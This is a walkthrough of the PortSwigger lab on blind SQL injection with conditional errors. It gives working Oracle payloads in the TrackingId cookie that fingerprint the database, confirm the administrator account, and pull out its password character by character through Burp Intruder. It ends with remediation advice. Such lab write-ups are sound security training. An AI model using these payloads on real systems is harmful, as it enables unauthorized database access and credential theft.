# SQL Injection — Lab: Blind SQL Injection with Conditional Errors

[Lab URL](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors)

## Objective

This lab contains a **blind SQL injection** vulnerability in the `TrackingId` cookie.

The application does not directly return SQL query results. Instead, SQL errors can be deliberately triggered when a chosen condition is true.

The objective is to confirm the injection, identify the database type, confirm the `users` table and `administrator` account, determine the password length, extract the password character by character using Burp Intruder, and log in as `administrator`.

---

## Initial Reconnaissance

I visited the front page of the shop and used **Burp Suite** to intercept the request containing the `TrackingId` cookie.

Original cookie:

```text
TrackingId=xyz
```

The `TrackingId` cookie was selected for SQL injection testing.

---

## Interesting Parameter

The interesting parameter was the `TrackingId` cookie:

```text
TrackingId=xyz
```

The cookie was modified in Burp Suite while observing changes in the server response.

---

## Testing

### 1. Testing a Single Quotation Mark

I appended a single quotation mark:

```text
TrackingId=xyz'
```

An error message was received.

This indicates that the additional quotation mark affected the syntax of the underlying query.

### 2. Testing Two Quotation Marks

I then changed it to:

```text
TrackingId=xyz''
```

The error disappeared.

This suggests that the quotation mark is being interpreted by the backend and that the resulting syntax error has a detectable effect on the response.

---

## Confirming SQL Injection

### 3. Testing a SQL Subquery

I tested:

```text
TrackingId=xyz'||(SELECT '')||'
```

The query still appeared to be invalid.

I then tested an Oracle-specific table:

```text
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

The error disappeared.

This indicates that the target is probably using an **Oracle database**, which requires `SELECT` statements to explicitly specify a table in this context.

---

## Confirming SQL Query Execution

### 4. Querying a Non-existent Table

I deliberately referenced a table that does not exist:

```text
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```

An error was returned.

This behavior strongly suggests that the injected input is being processed as a SQL query by the backend.

---

## Confirming the `users` Table

### 5. Checking Whether the `users` Table Exists

I tested:

```text
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

No error was returned.

This indicates that the `users` table exists.

The `ROWNUM = 1` condition limits the query to one row, preventing multiple rows from being returned.

---

## Conditional Error Testing

### 6. Testing a True Condition

I used:

```text
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

An error message was received.

Because `1=1` is true, the `CASE` expression evaluates `TO_CHAR(1/0)`, which causes a divide-by-zero error.

### 7. Testing a False Condition

I changed the condition to:

```text
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

The error disappeared.

This demonstrates conditional error-based SQL injection:

```text
Error    → condition is TRUE
No error → condition is FALSE
```

---

## Checking Whether the Administrator User Exists

### 8. Testing the `administrator` Username

I used:

```text
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

An error was received.

This confirms that the `administrator` entry exists in the `users` table.

---

## Determining the Password Length

### 9. Initial Length Test

I tested:

```text
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

An error indicates that the password length is greater than one character.

### 10. Increasing the Length

I then tested progressively larger values, for example:

```text
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

and:

```text
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

The process continues with:

```text
LENGTH(password)>4
LENGTH(password)>5
LENGTH(password)>6
...
```

Burp Repeater can be used for these manual tests.

When the condition stops being true and the error disappears, the password length has been determined.

In this lab, the password length is:

```text
20 characters
```

---

## Extracting the Password

### 11. Using Burp Intruder

Because determining every password character requires many requests, the request can be sent to **Burp Intruder**.

### 12. Testing the First Character

The cookie is changed to:

```text
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

`SUBSTR(password,1,1)` extracts one character from the password.

The values mean:

```text
password → source value
1        → character position
1        → number of characters
```

The extracted character is compared with the candidate character `a`.

### 13. Setting the Intruder Payload Position

Select the final `a` and click **Add §**.

The cookie becomes:

```text
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

### 14. Configuring the Payload List

The lab assumes the password contains lowercase alphanumeric characters.

In Burp Intruder:

1. Select **Simple list**.
2. Open **Payload configuration**.
3. Add `a-z` and `0-9`.
4. The **Add from list** option can be used to select the characters.

### 15. Launching the Attack

Click:

```text
Start attack
```

### 16. Identifying the First Character

The lab uses the HTTP response status as the signal:

```text
HTTP 500 → SQL error → tested character is correct
HTTP 200 → normal response → tested character is incorrect
```

The payload associated with the `500` status identifies the character at the first position.

---

## Testing the Remaining Characters

### 17. Testing the Second Character

Return to the original Intruder tab and change the offset from `1` to `2`:

```text
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

### 18. Launching the Second Attack

Launch the modified attack and identify the character associated with the `500` response.

### 19. Continuing Through the Password

Repeat the process for:

```text
SUBSTR(password,3,1)
SUBSTR(password,4,1)
SUBSTR(password,5,1)
...
SUBSTR(password,20,1)
```

Combine the recovered characters to reconstruct the administrator password.

---

## Login

### 20. Logging in as Administrator

In the browser, click:

```text
My account
```

Open the login page and use the recovered credentials to log in as:

```text
administrator
```

This completes the lab.

---

## Exploitation Flow

```text
TrackingId cookie
        ↓
Single quote → error
        ↓
Double quote → error disappears
        ↓
Test SQL syntax
        ↓
Identify Oracle database
        ↓
Confirm SQL execution
        ↓
Confirm users table
        ↓
Conditional divide-by-zero
        ↓
Confirm administrator
        ↓
Determine password length = 20
        ↓
Burp Intruder + SUBSTR()
        ↓
Test positions 1 → 20
        ↓
HTTP 500 identifies correct character
        ↓
Recover password
        ↓
Login as administrator
```

---

## Why It Worked

The vulnerability occurs because user-controlled input from the `TrackingId` cookie is incorporated into a SQL query.

The injected expression uses an Oracle `CASE` statement:

```sql
CASE WHEN <condition>
     THEN TO_CHAR(1/0)
     ELSE ''
END
```

When the condition is true, `TO_CHAR(1/0)` causes a database error.

When the condition is false, the empty string is returned.

Therefore, the HTTP response becomes a Boolean information channel:

```text
TRUE condition
    ↓
Database error
    ↓
HTTP 500

FALSE condition
    ↓
No database error
    ↓
HTTP 200
```

This makes it possible to infer database information without directly displaying the query results.

---

## Vulnerability

The application is vulnerable to **blind SQL injection using conditional errors**.

The `TrackingId` cookie can be manipulated so that attacker-controlled SQL conditions determine whether the database produces an error.

---

## Impact

In this lab, the vulnerability can be used to:

* Identify the database type.
* Confirm database tables.
* Confirm the existence of a user.
* Determine password length.
* Extract password characters individually.
* Recover administrator credentials.
* Authenticate as the administrator user.

The exact impact in a real application depends on the privileges of the compromised account and accessible data.

---

## Remediation

The primary defense against SQL injection is to use **parameterized queries / prepared statements**.

Developers should:

* Use prepared statements for database queries.
* Keep SQL code separate from user-controlled data.
* Validate input appropriately.
* Apply least-privilege permissions to database accounts.
* Avoid exposing detailed database errors.
* Avoid unnecessary response differences that reveal internal database behavior.
* Test cookies and other parameters that reach database queries.
* Implement appropriate authentication and authorization controls.

Input filtering alone should not be relied upon as the primary defense against SQL injection.

---

## Tools

* Burp Suite
* Burp Repeater
* Burp Intruder
* Web Browser

---

## Lessons Learned

* How a cookie parameter can be vulnerable to SQL injection.
* How quotation marks can reveal SQL syntax behavior.
* How SQL syntax can help identify an Oracle database.
* How Oracle's `dual` table is used in this context.
* How conditional errors can turn database conditions into observable responses.
* How `CASE WHEN` can trigger an error only when a condition is true.
* How `ROWNUM = 1` can limit a query to one row.
* How `LENGTH()` can determine password length.
* How `SUBSTR()` can extract individual characters.
* How Burp Repeater is useful for manual testing.
* How Burp Intruder can automate character testing.
* How HTTP status codes can act as the response signal.
* Why parameterized queries are important for preventing SQL injection.

---

## Key Takeaway

This lab demonstrated that SQL injection can remain exploitable even when an application does not directly display database results.

By deliberately triggering an error only when a chosen condition is true, the database becomes a Boolean information channel:

```text
HTTP 500 → condition true
HTTP 200 → condition false
```

This signal can be used to determine information such as password length and individual password characters.

The correct defense is to separate **SQL code from user-controlled data**, primarily through parameterized queries and prepared statements.
